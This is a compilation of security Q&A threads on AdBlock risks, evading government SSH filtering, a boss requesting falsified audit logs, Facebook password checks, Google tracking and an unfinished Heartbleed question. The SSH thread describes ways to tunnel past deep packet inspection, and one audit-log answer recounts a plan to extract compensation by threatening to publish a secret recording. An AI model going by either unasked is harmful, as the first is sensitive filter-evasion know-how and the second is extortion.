That being said, I'd consider AdBlock as a defence against phishing. A lot of questionable software gets pushed to users through ads masquerading as something else - i.e., a site offers some item that a user wants, but has an ad that looks like a download button, and delivers some adware/malware product instead of the actual content on site, and such 'accidentally' downloaded malware is a serious security risk. Similarly, there have been incidents of mass consumer attacks by running an ad banner containing a zeroday exploit, which would cause the exploit to appear on respected, well trusted sites.

For company-wide security practices, it may make sense to require AdBlock and install it by default on every workstation - since it is especially useful to protect the inexperienced users who wouldn't install it themselves. This would cause a risk by trusting one more software product, but would be a net positive for everyday security.
AnswerKenntnis:
The way this information is spread by United Internet is misleading (I am trying hard to avoid saying "libel"). The allegation as it stands is clearly wrong by all objective means, and the presentation is defamatory.

Of course, in principle, one has to admit that Adblock (Plus) is of course a potential security risk. Whether this risk warrants a reasonable concern is another thing.

Adblock (Plus) might be a security risk for three reasons:


It is software that runs on your computer, which could, like all software, in principle do almost anything. Including showing false information or stealing your data.
It does modify web page contents, that is what blocking ads is about. Certainly, a software which is well-known to modify the contents of web pages could modify the contents in a malicious way and go unnoticed much easier than another software.
It performs this task by matching a downloadable list of regular expressions from a range of (uncontrolled/unknown) third parties, such as EasyList


So, if you are in ultra-paranoia mode, you might fear that either someone at EasyList (or another filter list provider) modifies the filter list so they do something malicious, or a hacker hijacks the site. Your Adblock Plus addon would presumably download the malicious list during its daily/weekly update without knowing and without a means of verification (there is a checksum that can be embedded, but this only protects from accidential corruption, not malicious modification).
As a result, such a malicious block list could in theory cause the addon to do "evil things".

Luckily, apart from JS exploits, there is not too much harm that could realistically be done via this attack vector due to the way Adblock works (it will match an arbitrary regex, but it won't do arbitrary susbstitutions, so hiding some elements it shouldn't hide or letting some ads through is pretty much the worst possible case).
On the other hand, a JS exploit could be used against you without Adblock Plus running in the first place.

Also, obviously, like any third party software (including Firefox or Chrome itself!) the Adblock Plus addon itself could steal your data. All you can say at the present time is that so far this has not happened.
Then again, almost all of the big commercial players in the business are doing untrustworthy things on a daily base, which nobody objects against.

Now you have to ask yourself how likely it is that Adblock Plus will indeed steal user data, and how likely it is that such a thing would go undetected for longer than a day or two on a widely-deployed open-source project.  

Frankly, if you believe that this is a serious and realistic threat which is likely to affect you, then you must also believe that the Microsoft in collaboration with the NSA already builds identity theft functionality right into Windows and that every computer has a secret "kill switch" which the US DoD can activate at will (that too, is in principle possible, and it's actually more likely to be true than the author of Adblock stealing your savings).

You should not trust GMX either in this case, since they will (note the wording, will, not may) share all your personal data and traffic information in a malicious and unethical way with other parties (at least with US agencies, due to Schr├╢der's 2001 treaty, but you have no way of telling with whom else).
You also shouldn't trust 1&1 (another member of United Internet) because they will share your personal data with who-knows-whom (being an US based company). Nor Google, nor the other half of the internet for that matter.

On the other hand, Adblock Plus has demonstrably prevented malware from being installed on users' computers in the past.
AnswerKenntnis:
The other answers forget to mention the issue aside from trust: That adblock is modifying pages you visit. This and having to trust more developers is why I have never used ad blocking software/browser plugins, and strongly recommend against it.

It is well known that websites depend on all kinds of fragile invariants for security. For example, just look at the ways clickjacking has been addressed in the past. There is nothing stopping adblock from mistakenly violating an invariant that the site depends on for security.

Also adblock and other ad blocking software decrease anonymity. An adversary can either make you run code to browse the DOM tree and look for missing parts / alterations, or passively observe that you aren't making certain requests to fetch ad-related content (some of which may be hosted on the site itself, making it a possible adversary).
AnswerKenntnis:
Something no-one has mentioned here is that Adblock plus along almost all other browsers and  extensions can be updated remotely. This means there must be a backdoor in the program even if it is locked down to specific "trustworthy" update URLs. This could be interpreted as spyware, but spyware is a somewhat abstract term.

It's true that most people have said it is not safe as it has permissions to read and send data although it's widely accepted that Adblock plus in particular is not malicious. Despite for the most part being open source (Adblock included) browser software and extensions are only as secure as the update URLs for which there is no way of knowing how secure they actually are as the code for these services is remote and therefore not accessible.

Obviously no software or server can be 100% secure due to entropy and having users, but to obtain the highest possible security you should study the source code, always build from source and disable automatic updating. Like with all software, browsers and extensions are only as secure as the user makes them.
QuestionKenntnis:
What alternatives are there when SSH is being actively filtered?
qn_description:
Unfortunately our government filters the SSH protocol so now we can't connect to our Linux server.

They do the filtering by checking the header of each packet in the network layer (and not by just closing port). They also do with with VPN protocols.

Is there any alternative way to securely connect to a Linux server?
AnswersKenntnis
AnswerKenntnis:
From what I heard earlier today, https/ssl flows correctly through your borders.

You should hence check out Corkscrew.

Similarly to netcat, it's used to wrap ssh in https to allow the use of https proxies.

Another solution would be to use LSH which, by having a different signature than ssh, works from Iran as Siavash noted it in his message.
AnswerKenntnis:
Based on a talk at the CCC conference - 28C3: How governments have tried to block Tor - the Tor Project has the best track record in this dynamic and challenging field, and it can be used for SSH.  Innovative usage of Tor bridges is one of the latest developments.  The 28C3 Tor talk is also on YouTube and the slides are at https://svn.torproject.org/svn/projects/presentations/slides-28c3.pdf

Note that using evasive methods that can be identified too easily can expose the user to yet more violations of their human rights and personal security.  Be careful.

Update: Article 19 of the The Universal Declaration of Human Rights is relevant here:


Article 19: Everyone has the right to freedom of opinion and expression; this right includes freedom to hold opinions without interference and to seek, receive and impart information and ideas through any media and regardless of frontiers.
AnswerKenntnis:
If you have unfiltered https you can do something like AjaxTerm or any other AJAX or HTML5 based terminal emulator running on a protected site within a webserver that can either connect to a local ssh daemon or in certain cases to remote ones on other interfaces of your machine.

Another option (tough a bit obscure) if you have ICMP to your box would be to run TCP/IP on top of ICMP if that is open. See here.
AnswerKenntnis:
You have several options for tunneling IP over other protocols. Besides using something like corkscrew, you could try implementing IP/DNS (i.e. with iodine) or IP/ICMP.

In other case you could also use something like http://www.serfish.com/console/
AnswerKenntnis:
Try sending the SSH handshake over more than 1 packet. A lot of packet filtering technology operates on a packet level and won't buffer for the inspection. 

If this doesn't work, try doing this but sending the two or more parts of the handshake out of order. Only if the DPI box is reassembling would it catch the handshake.
AnswerKenntnis:
You could use something like VNC, but without a secure tunnel like a VPN or SSH, it's not very secure. If they filter that too, you're going to have a hard time.
AnswerKenntnis:
Another option, but one that will require that you first get access to your server some other way so you can install the daemon, is telnet-ssl/telnetd-ssl.

Unlike some of the other options that have been suggested, this won't require a lot of network overhead, and is very simple to use (once the daemon is running).
AnswerKenntnis:
You can also consider tunneling SSH traffic over DNS using tools like OzymanDNS or iodine
AnswerKenntnis:
If you know that your current internet connection is being filtered, then use a different internet connection method like a satellite internet service provider. There are a number of different satellite internet service providers: list1, list2.

(The author's original question did not state any restrictions on getting some alternate form of connectivity.)
AnswerKenntnis:
You should be able to just change the ssh port to 443 and then connect through it. Unless they are doing a man-in-the-middle attack they shouldn't be able to tell the difference between ssh and https. 

This has worked on all firewalls I've tried it on. (admittedly not that many)

I would be interested to hear if this works. Thanks.
QuestionKenntnis:
What should I do when my boss asks me to fabricate audit log data?
qn_description:
My boss just asked me to create a fictitious log entry to say that a user's account was updated before it was, to win a dispute.

I feel this is not right because I am trying to start a career in working with data technology. Whether or not I get caught, the integrity of my data will be questionable, and my character compromised.

What would be the best way to handle this?

I have a far more professional company wanting to pick me up, and they are willing to hold the position for me until I finish the project at my current job. We are roughly a month out; should I cut and run now?

Sorry this is a little off topic, but I know some established professionals frequent here, and just need to know the best way to go about handling this with character.


  This question was IT Security Question of the Week.
  Read the Mar 30, 2012 blog entry for more details or submit your own Question of the Week.
AnswersKenntnis
AnswerKenntnis:
Ask your boss to put the request in writing before you do it.

Make sure to keep a copy of the request in your own personal files. Ideally a paper copy at home, or maybe an email in your own personal email account.

You say that you already have a better job to go to, so just give your notice now and leave the company as soon as the notice period is up. Presumably you have a notice period? A contract of employment?

If you don't have a better job to go to, then find one as fast as you can.
AnswerKenntnis:
Don't do it.  I did something unethical once for an executive and I am still troubled by it to this day.  For legal reasons I cannot tell anybody.

It is unethical and you have another job lined up.  Don't let him bully you.  If he fires you then make sure you have in writing his request and you have legal grounds to sue for wrongful dismissal in most jurisdictions.  That would be a pretty cut and dry case and you would make out greatly if he were to fire you, especially since you can just show up at the other job and not miss any income.

I would talk to an attorney who specializes in employment law too, most will give you at least a half-hour consultation for free.

Don't make the same mistake I did.
AnswerKenntnis:
Does your company have an ethics officer, internal auditor or internal council? If so, then you should contact that person, explain what you have been asked to do (in writing), and let them handle it. If it is a small company without any of these positions, then take your concerns to the owner/president (also in writing).

As far as your company is concerned, this is the best way to handle this. The possibility exists that your boss is acting on his own and against company policy; this would allow your company to deal with him in an appropriate fashion. If you don't do this, your company could claim that they never knew anything about it and that you must be the problem. After all, with the level or integrity that your boss seems to have, he may deny ever asking you to do this.

You have nothing to lose, as you are planning on taking a new job anyway.
AnswerKenntnis:
If you have your boss' request in writing in any form (paper, e-mail, etc.), make a copy for yourself that can be stored somewhere outside of your boss' control.  Depending on the sensitivity of the information stored in the logs he's requested you to modify, you may also want to keep your own copy of the logs.  (This is to say:  If the logs have any data that is too sensitive, you probably should not be exporting them.)
Consult a lawyer with experience in this field.  Depending on what implications your log changes may have, it could be something that eventually comes back to bite the boss in the end.  If that happens, and even if you actually didn't make the changes yourself, then you could be on the hook as well under "accessory" or "conspiracy" charges if you fail to report it to authorities.  Find out what is necessary to protect yourself from this, and do it - even if it does mean reporting your boss.
Don't make the requested log changes.  It's not worth it.
Get away from that company as soon as you can.  You may want to get your lawyer's opinion on how quickly you can do this without putting unnecessary contractual burdens on yourself, but do not let that project be your only reason for staying.
If your new employer asks why you're suddenly leaving so soon, you may cite an ethical disagreement with upper management and leave it at that.  Again, consult with your lawyer as to how much or little detail you should disclose.
AnswerKenntnis:
Do not do it.  Even in writing it does not matter.  At the end of the day its your butt on the line.  If you're boss asked you to shoot someone with a gun, and you got him to write permission in writing, do you think anyone in the court would care if your boss gave you permission or not?

Regardless, you will be held accountable, not your boss.  If your boss has a problem with it tell he or she that you would be perfectly happy writing a letter as to why you are not comfortable doing so. 

This is actually entrapment, forcing you to break a law, but if you pull the trigger it will be on you, not your boss.  If its a serious issue, you would want to report the entrapment.
AnswerKenntnis:
It is never worth doing something unethical. You need to live with yourself. Professional programmers should always be PROFESSIONAL, and part of that is always acting with integrity! If your boss' action is typical of the rest of the organization, it may be time to look for another position.
AnswerKenntnis:
This is wrong and you should tell your boss that it is wrong. It's not reason enough to leave your job unless your current employer isn't willing to discipline your boss in any way for trying to deceive a customer. If they don't take this seriously, you should move on. No sense in working for a company that allows this practice.
AnswerKenntnis:
The idea of getting it in writing is a good one, but if he isn't the "pointy hair dude" he is never going to do it. 

If this gets out, you are associated with it no matter if you did it or not (be sure that there will be someone to do it). So, if you can, cover yourself as best you can, and leave as fast you can. I know, this seems cowardly, but from personal experience is better than making a fuss about it. You see, he got there by employing the same tactics, and he won't hesitate to use them to fsck you if you cross his way (or just for fun).


  Never fight morons, they will drag you at their level and beat you
  with experience.
  
  Tell me with whom you walk and I'm going to tell you who you are.


(these are losely translated from my mother tongue, but I hope you get the picture)

Best of luck to you, on your new job!
AnswerKenntnis:
Save a copy of the current logs and encrypt
Get the request to falsify in writing
Do not make changes to the logs


What to do after this point is up to the legalities you are subject to. I would be sorely tempted to inform the other party of the request and offer them the unmodified logs.
AnswerKenntnis:
Does he realize what he is asking? If he is focused on winning the dispute then tell him this not the way to win, it is cheating and any/all types of benefits from such an act is meaningless.

This is not only your problem, at times people become so focused on something small that completely forget themselves, in times like that a good shepherd has to bring them back to the flock. 

He needs your help, but not in doing what he is asking from you, but in the way of moral guidance. This is not just a case of doing or not doing something wrong cause someone asked you to do it, it is a case of making them realize what they are asking, and if this gets done ( by either you or your replacement ) they would lose a part themselves forever. 

Maybe the Ivy league or private school he went to made him thinking winning is everything, but even his mum can tell him this is wrong. Just tell him you are gonna tell his mum if he goes on with it, then tell him if that would make him feel ashamed then maybe it is not something he should be doing.

If after all your guidance it still doesn't change, then walk away, no job worth a stain on your soul.
AnswerKenntnis:
I'm once in a similar situation (it's not about log data, but deal with ethics nonetheless)

Some of the answers mention about asking your superior to put the request in writing. That sound good and nice. But it is important to know your country culture and your boss intelligence as well.

For my case back then, my superior was intelligent enough to sense my plan of protecting myself while possibly putting him in danger(it was actually so obvious the moment you request/hints at getting something in writing), I don't want to get into the details, but things are changed and I'm removed very swiftly without me expecting it to be that fast. It was painful and depressing.

Also if such a culture (of covering up) is common in your country, your future employers knowing about it (I don't know about you, but over here, some companies job applications forms require you to state whether you have been fired or forced to resign before and state the reason) might view this as a negative trait rather than something positive.

In fact, there is this local news recently about a previously highly paid engineer who has been working as a rag and bone man for some years to support his family ever since he was 'laid off' after whistle blowing on his company. Even after the news is reported, he was still unable to get a proper real job (due to age, over qualified.etc) and that is a possible consequence one has to think about too.

Bottom line is, it's good to consider the ethical aspects of it, but do think of the bigger picture too. Can you afford to lose this job in your current circumstances? What is the current situation? is this really serious? Any backup plans?.etc

Also, consider getting proofs in less obvious ways such as instant messaging your superior, e.g. ('I kind of forgotten, so just to confirm, modify this xyz record to 5?') and the moment he reply to this instant message on skype.etc, you have a record already.

Still, if the conclusion is that you rather lose the job than to do such a terrible crime, then be the one who resign. At least you will feel better in the sense that it is you who ditch your superior, not the other way round.

Regardless of whether you will do it anot, try to plot your escape as soon as possible.
AnswerKenntnis:
I had a similar case where I was asked to cover up a code theft. 

I consulted an attorney who told me that the best for would be to just leave the company and forget it. 
What I did was to talk with my manager and make sure he understand that this is bad thing and that I'm against it and to hear him telling me to do it anyway. ALL THAT RECORDED with my smartphone.
My plan was to resign and to ask for compensation otherwise I'd publish the whole thing but a day after the recorded meeting the boss told me that he thought about it again after our meeting and that I was right. So nothing happened and nobody knows about the recording.
AnswerKenntnis:
As a professional, or at least if you ever want to be one, you should learn to say 'no' even if it costs you your job. Reading the popular answers about putting request in writing - sure, you can do so to cover your ass, but in my experience showing spine pays off way more than covering your ass. 

In the long run, spine is always stronger than a piece of paper. 

Regardless of the country you're in - you're a person with a choice. Even if you were eaten you always have 2 "exits".
AnswerKenntnis:
The absolute first thing you should do is hire a lawyer.  Do not pass go, do not collect your check, do not speak to your boss or anyone else at that company UNTIL you have spoken with an attorney.  Go ahead and pay their retainer.

At this point there are a lot of different things that could cause you to go to jail, depending on where you live.

In some places it is a crime to simply ignore/not report one.  If this is the result of a criminal investigation your ass could land in hot water for simply turning the other way, let alone actually doing what the moron asked you to.

If it's the result of a records request caused by a civil litigation and you don't tell the company attorney about this, it could bite you.  It might bite you if you don't tell the opposing counsel...  Ask a lawyer what to do.   Regardless falsifying ANY data submitted to a court is grounds for criminal proceedings against you.  

Another tact: What if someone overheard your boss making this request of you and reported it?  You could be in trouble for simply not doing anything.

At the end of the day it's entirely possible that the boss in question either modifies those records him(her)self or has someone else do it and blame you if caught.  Given the bosses lack of ethics I wouldn't put it past them.

Point is, get a lawyer right freaking now.
AnswerKenntnis:
Do yo work for a publicly traded company or otherwise fall under SOX? If so, could get yourself into a world of hurt.
AnswerKenntnis:
First, quit and go to your new job. Leave on as good terms as you can. When asked why you are leaving, say something harmless about what a great opportunity the new job is.

Second, once you're gone and have started your new job, report your old boss. If your company has some sort of ethics process - make the report there (it can be anonymous but in this case it's obvious who is doing the reporting). If there is no ethics process in place and this is a big company you might try the audit committee. As a last resort, there's either his boss or HR. In a small company, there's the CEO or the owner.

Remember that companies in general try to avoid trouble and smooth things over. The suggestion to consult an employment lawyer is a good one.

Do not put yourself in the position of reporting your boss while you work there if you can avoid it. These situations often do not work out well.

You should check with your lawyer to see if saving a copy of the original log somewhere on your company's system (NOT taking a copy with you) is a good idea.
QuestionKenntnis:
Does Facebook store plain-text passwords?
qn_description:
I was about to reset my Facebook password and got this error:


  Your new password is too similar to your current password. Please try another password.


I assumed that Facebook stores only password hashes, but if so, how can they measure passwords similarity? This should be impossible with good hashing function, right?

Question is - how is this possible and what are the implications?

Thanks in advance. 

UPDATE

I didn't make it clear - I was not asked to provide old and new password. It was the "reset password" procedure, where I only provide a new password, so most of answers of suggested duplicate are not applicable.

UPDATE2

mystery solved - see comment (from Facebook engineer)
AnswersKenntnis
AnswerKenntnis:
Let's hope and assume that facebook stores only hashes of current password (and potentially previous passwords).

Here is what they can do:


user sets first password to "first" and fb stores hash("first").
later on, users resets password and is asked to provide new password "First2"
facebook can generate bunch of passwords (similar to the new one): ["First2", "fIrst2", "firSt2", ... "first2", ... "first", ... ] and and then compare hash of each with the stored hash.


This is the only solution that comes to my mind. Any other?
AnswerKenntnis:
I wouldn't know if they do (don't even use Facebook), but it's also possible that they use Hardware Security Modules (HSM) for their cryptoprocessing that don't store hashed passwords but merely reversibly encrypt them. With the volume of authorization requests they have to deal with, this would make perfect sense, as it's orders of magnitude faster than secure (read: slow) password hashing, while still offering safe password storage.

HSMs could then be programmed to compare stored and new password as an input of one of their functions and merely return result of it (could even be a boolean value in our case), with the original password never even transmitted or stored in plaintext anywhere, besides their internal memory (which is tamper resistant). This is usually referred to as an onboard secure key and application storage/processing.

By the way, many banks use HSMs because a proper implementation of it also requires physical security for the devices themselves and the way they're accessed (plus, they are rather costly), but this obviously provides a great deal more flexibility in the way passwords can be processed securely without them ever being disclosed.
AnswerKenntnis:
There's only one correct answer to this. Nobody knows (except Facebook).

Facebook could store your facebook password in plaintext, but there also might be some scheme that uses fuzzy hashes or pre-computed hashes of similar passwords.

There is really no way of knowing unless we were to break into facebook and audit all of their assets.
AnswerKenntnis:
Another possibility is that fb doesn't hash, but encrypt passwords with their master key. Than they could decrypt it anytime to compare it to your new one.


Let's hope not - they should hash it!
As Rell3oT pointed out, no one knows except fb. So all we can do is throw wild guesses into the ring.
AnswerKenntnis:
Another possibility is that Facebook stores a hash of your password, and a hash of the SOUNDEX of your password.  Then when you enter your new password, it can compare the hash of its SOUNDEX with previously stored ones and respond that a password is too similar.

This is, of course, purely conjecture.
QuestionKenntnis:
Is Google spying on all of us?
qn_description:
I am curious because, I experienced something bizarre recently. About a month ago, someone asked me to find out a price for a T-shirt printing machine, and probably for the first time, I pressed these keys and started searching, searching, for long and many found many results only using through the Google search engine. But now, even after two weeks has passed.. I see almost all the Google ads in the site I visit including YouTube have been changed, and only advertise T-shirt printing machine. Like the ones I was searching. 

There is only one explanation for this, and Google has been controlling what I search and keeps log of these keywords. This might be normal for some people, and most of you might have known about this, but I find it unjust that a site can keep track of what you type and what you look for without asking permission. That's right! isn't it? We can agree to the terms and conditions when we signup to Google, but, they should be mentioned in the terms, or be specified in a very apparent manner.

edit: There have been responses from users, which according to them: Google has been snooping information from their private emails.
AnswersKenntnis
AnswerKenntnis:
Advertisers use what information they have to try to best guess what sort of ads you will be most interested in. In Google's case, your search history is the best indicator they have, but ad clicks and ad impressions are also considered. In Amazon's case, for example, your purchase and product browsing history is their best indicator, and you'll probably notice that their suggestions closely mirror your recent history ΓÇö even if that most recent history dates back to two years ago.

My own search and browsing habits tend to favor highly technical content; servers, programming, malware, etc. The ads I see when browsing under that profile therefore tend to also favor technical content: colocation, hosting, software, etc. This is totally Fine By MeΓäó. When I watch TV, I have to endure a depressing amount of ads about feminine incontinence, retirement homes, and herpes medication. But on the Internet, the ads are all software and servers.  Do I think that's creepy? Hell no. The fewer herpes ads the better, IMO.

To be clear: I'm a strong proponent of online privacy. However, I manage my online privacy by controlling the information I make available online. I don't expect others to maintain my privacy for me; the concept doesn't even make sense. If you don't want them to know something, then don't tell them. Telling them and then demanding that they forget is a recipe for disaster on numerous fronts, and even comical from a security standpoint.

If I don't want a search associated with me, I use a private browsing session, possibly from a different IP if I were to be worried about something. Sure, I could use a service that promises to not remember what I tell them, but I would be an idiot if I were to depend on that promise. Remember Hushmail? Still, I prefer to use a service that allows me to craft my own online preference profile so that they can filter out all the crap I clearly don't want.

Is this legal? ΓÇö So far yes. I would hope that it remains so, since the unintended consequences of making it illegal would be so far reaching and unexpected that it would have devastating consequences for completely innocent Internet users and site operators. Internet regulation reliably makes things worse.

Does this bother me? ΓÇö Of course not. If I buy an apple from a market, is it creepy for the vendor to ask me the next day whether I liked my apple? Do I think he's spying on me? If I tell him I liked it, is it creepy for him to suggest that I buy more apples at a subsequent visit? No, of course not. It's just good customer service. If he tells the fruit vendor next door that I like apples, should that be illegal?  Of course not: It's his information to give, just like any conclusions I make about him are my information to share as I see fit.

Vendors online remember what we tell them just like vendors at your local market. My fruit vendor may remember that I visited his store even though I didn't buy anything, and yet I don't assume that he's spying on me. I'm visiting him, not the other way around. Likewise, when I visit Google, I don't think it's spying for them to remember what I ask them.

The biggest problem with online privacy is the implicit belief that because I connect to the Internet from the privacy of my own home, anything I do on the Internet also happens in the privacy of my own home. This is lunacy. Everything you do on the Internet is absolutely public unless you can verifiably prove otherwise.
AnswerKenntnis:
You can change your Google Ads Preferences by visiting http://www.google.com/ads/preferences/.  This includes changing your interests, demographics, or opting out of having personalized targeted advertising in general. You can check if opting out was successful by verifying that the web history list at the Google opt-out page is empty.

You need to allow your navigation browser to interact with cookies. Therefore, if you make the changes on your settings as well you might need to clear them from your storing folder and/or restart your browser if there is a caching triggered event happening for that application.
AnswerKenntnis:
I don't have the legal information handy, but I will share my perspective on what may be happening & what I do in this instance.  Overall, this sounds like an advertisement cookie that has altered your advertisements or you searched Google while logged into the search engine.  Here are some things you can do in the future to prevent this type of tracking:

Search engine

For this reason I use DuckDuckGo.com (an unbiased search engine, see more here) that doesn't track or bubble your search results.  

However using a different search engine isn't enough.  Websites, advertisements and other things will track your browser using cookies and a few other techniques to identify you and your purchases.  To this end you may want to use incognito mode or clear your cookies and browser history.  Additionally since you can authenticate to Google and Bing with an email address you should know that your history may be recorded on a server.


Here is a link to your Google server-side search history
Here is a link to your Bing server-side search history


Cookies

Some people delete cookies thinking they are gaining more privacy by doing so.  You may consider doing this, but know it isn't 100% effective especially with things like the evercookie around.

Incognito mode

Several answers here mention incognito mode of your browser.  If you use this, you may be interested in this answer that asks: Can web sites detect whether you are using private browsing mode? 

Bottom Line

It's pretty tough to avoid being tracked by 3rd parties.  However if you use Firefox the following addins should be a good start at protecting your anonyminity:  (Thank you @DW)


Privoxy
TACO
ABINE
ADBlock Plus
NoScript
GoogleSharing
AnswerKenntnis:
If you want to call it spying, yes, of course they are. 

Think about how much information Google has about you. Imagine how much more they can charge for advertisement if they combine all of their information about you from all of their sources: 
Search engine, gmail, youtube, google analytics, chrome, android (contacts etc), maps, calendar, google docs/drive, google+, gtalk... and I've probably missed a few big ones. 

Just stop for a few seconds and think about how much they know about your life just from that data.

It would be stupid not to claim it's for the good of the users, so they do. Source

I think it's legal since you accepted their new agreement a few months back. 

Ethical? Well, you decide.

In 2012 information is power. Who's got the power?
AnswerKenntnis:
"Some Google services are supported by advertising revenue and may display advertisements and promotions on the service. Such advertisements may be targeted to the content of information stored on the Google services, queries made through Google services or other information. The manner, mode and extent of advertising by Google on its services are subject to change. As consideration for your use of Google services, you agree that Google may place such advertising and that Google shall not be responsible or liable for any loss or damage of any sort incurred by you as a result of the presence of such advertisers on Google services or your subsequent dealings with advertisers."


If you use Google, you implicitly accept the terms of service, portions of which are quoted above.  The portions I've bolded explain the behavior you saw.  This isn't "spying" in any sense that I can understand the word.  This is an effort to add value to the services that they provide to you and to the advertisers.  You have ample opportunities to control the information that google obtains about you, and can request that they remove/destroy the information.
AnswerKenntnis:
Yes, Google "spies" on us. But that's explicit; it is written in the usage conditions. If you go to www.google.com and click on the "Privacy & Terms" link, you can get to a page linking to their Privacy Policy and their Terms of Service (these documents are the ones for Canada, different versions may be applicable depending on your country). Google made quite some effort to write these documents in clear human language rather than arcane legalese, but they still are quite long, so allow me to summarize them:


  By using Google's services, you allow them to collect information on you, and use it for several purposes, main of which being targeted advertising. The information they collect includes your search queries, the contents of your Gmail emails, your OS and browser versions, your behavioural patterns...


I suggest that people interested in the subject make the effort of reading both documents extensively; they are instructive.

Is it legal ? Given that there are 193 sovereign countries in the World, and that some (actually many) of them are federal states whose individual provinces or regions often exercise some considerable legislative autonomy, then there are hundreds of jurisdictions to take into account, and any precise answer to that question would be much longer that even I would care to write.

Google is rich enough to buy extensive legal consulting, so chances are that what they do is legal, or at least was made legal. There can still be local variations. For instance, in France, handling of personal information is regulated by the CNIL which is currently battling with Google on these matters. So while what Google does is, on average, built on sturdy legal foundations, the jury is still out in many jurisdictions.

What is the big picture ? An important point to be made is that there are consequences. A rather common but simplistic reflex is to declare that one party is Evil and the other is Good, and be done with it; this is how most Hollywood action movies work, and this manichaeism now permeates the way the "general public" envisions political issues which exceed in scope and scale what can be dealt with within the boundaries of a small village. It would be easy to simply state that "Google is evil, they are villains, let's kick their ass." The reality is somewhat more complex.

Indeed, Google offers services which many people have come to consider as essential. I have known the Internet before the search engines, and it was rather hard to navigate. However, servers and code don't grow on trees; to have a service which works as well as Google's, be it a search engine, a video hosting platform or a reliable Webmail, some resources must be used at some point. To speak crudely, this costs money. Quite a lot of the stuff, actually.

Google is a private venture which aims at making more money than what it began with, and it is apparently quite successful at it. From the Wikipedia page, we can learn that Google makes more than 50 billions of dollars per year, and 96% of it comes from ads. This "spying" is their life force. Google can provide their nifty services to us, for free (apparently), because they can gather some personal information from users and use it as fuel for their advertisement business.

We are paying for the Internet with our privacy. That's the naked truth of it. That which we pay to Internet Service Providers, and indirectly through our taxes and subsequent state investments into infrastructures (direct or through subventions), would not be sufficient to pay for the Internet as we experience it today. It would allow for the copper cables and optic fibres, but not for all the data organizing that Google and its ilk provide (all that I say would also apply to Yahoo!, Bing, and all others, but Google is the pack leader so we can concentrate on them for now).

Google's services are paid for by advertisers, who in turn feed themselves, through Google, on our privacy. That's the deal which is in place. Right now.

Does it bother me ? Not the concept. My privacy is mine, so it is mine to give or sell. As @tylerl explains, this has side benefits, in that targeted ads are just that: targeted. What bothers me is that:


The whole deal is global in nature; either everybody sells their privacy to pay for the Internet, or not. There is little room for individual choices. I cannot really decide whether I, personally, will yield to Google's prying eyes or not. This is as if my privacy had become part of a general "shared privacy" (however weird this sounds) which has to be managed as a shared resource, like air, water or oil. History shows that my fellow humans are not very good at making adequate management of shared resources.
Most people don't realize that they get a cheap Internet because of such deals. They believe that once they have given their monthly 30 EUR to their ISP, they are done with it and can download and surf and be entertained without any limit. They don't understand how implausible such a deal would be.
If we are paying for the Internet with our privacy, then I have the nagging feeling that we are selling very cheap. Google makes a lot of profits; this may indicate that the services we get from Google are actually worth much less than what our collective privacy was.


My current plan is to raise awareness and understanding of these issues, as in the present text. The more people think about them, the more probable it becomes that someday, someone will come up with something intelligent to say on that subject.
AnswerKenntnis:
To be a little more specific about Google directly, what you hit on here is exactly why Google is Google.  That is the main thing their money comes from.  As Tyrel mentioned, marketing is all about getting the most successful impressions for the money.  Google hit on a powerful niche of marketing by realizing that they could tie people's searches to advertising, but do it in such a way as to not compromise the validity of the search.  The idea was around prior to Google, but many places that did it simply put paid listings higher up the search results without indicating them as such and thus the quality of those search engines suffered.  Google's Terms of Service clearly indicate that they can and will do this and use of Google's services constitutes acceptance of this.

To the consumer, it is important to be aware of what information is being collected about you and how it is being used, but it is also worth pointing out that this monitization of your information is what allows internet marketing (the good kind, not spam) to be so effective and therefore so much more profitable.  In an ideal world, this monitization is passed on to the consumer as free or cheap services that are useful to their life, such as, say powerful search capabilities, open source mobile OSes and free/cheap VOIP service.  Even the cost (giving up a little privacy about your searches) has benefits to the consumer, such as more valid advertising than they would otherwise be inundated with.

That isn't to say that you shouldn't be careful what information you put out there and be sure you are comfortable with it being out there before you put information out in the public.  It is however important to remember that it is a two way street and you get valuable goods and services in exchange for agreeing to share some information so that they can serve both you and the advertisers better.  It's a win/win for everyone as long as the middleman does their job well (which thus far Google has really been the model of doing it right for the most part) and all parties are aware of what is going on and agree with it.
AnswerKenntnis:
So here are my two cents:

Advertsing is Google's main business. If this Wikipedia article is correct, in 2011 96% of their revenue derived from ads. So in order to show you the most effective ads, they need to know where do you live, what your interest are, etc. From this point of view they are not interested in your info as an individual, and following good browsing practices you can achieve a decent level of anonymity.

At this point we've to talk about profiling. Even if you change IPs, delete cookies, use proxies, etc, if your browsing patterns are the same they can identify you. Not that they can know where exactly do you live or how old are you, but they can know , for instance, user 36576235426 is online, he is in his late 20s and likes blue T-shirts. That said, IMHO Google's profiling is light compared to what Facebook does.

However, your data could still be used by third-parties if, for instance, Google makes a deal with corporation X so that they can exploit a part of their data. Or by governments, which have both regular and irregular channels to ask Google for data. In an extreme case, if a terrorist escapes jail while wearing a pink and green rubberduck shirt, and a week ago you were searching for "pink and green rubberduck T-shirt" in Google, I'll bet my hat the feds will be ringing at your doorbell in no time :)
AnswerKenntnis:
Google web apps like Calendar, Analytics and Gmail, Chrome browser, Android OS, search engine are only a way of get people used to use Google stuff. It seem so familiar now.

However, I don't really think that Google cares about developing an incredible piece of software like Gmail. They only give you these tools cause it makes you used to be tracked, under hard spying.

Not evil? I don't think so. They ONLY want to display adds and make money.

The gold medal is certainly the Analytics tools that makes each website runs a kind of tracking back door: who is watching which website, when, who long, where, who, etc. It is installed on every website and it's really just like the worst spying nightmare. 

Most of the people don't care about all this, so they don't even know they are tracked. How analytics can be legal? It send so many informations to Google (not really to the Webmaster who intalled it I mean), even if you don't ever sign for anything or even if you don't have a Google account (they can make stats about this kind of people too!). 

Should it be legal? I don't think so.
QuestionKenntnis:
What should a website operator do about the Heartbleed OpenSSL exploit?
qn_description:
CVE-2014-0160

http://heartbleed.com

This is supposed to be a canonical question on dealing with the Heartbeat exploit.

I run an Apache web server with OpenSSL, as well as a few other utilities relying on OpenSSL (as client). What should I do to mitigate the risks?




The bug dissected
Check if your site is vulnerable (Duckduckgo.com is, for instance!)






 I looked at some of the data dumps
 from vulnerable sites,
 and it was ... bad.
 I saw emails, passwords, password hints.
 SSL keys and session cookies.
 Important servers
 brimming with visitor IPs.
 Attack ships on fire off 
 the shoulder of Orion,
 c-beams glittering in the dark
 near the Tannh├ñuser Gate.
 I should probably patch OpenSSL.


Credit: XKCD.
AnswersKenntnis
AnswerKenntnis:
There is more to consider than just new certificates (or rather, new key pairs) for every affected server. It also means:


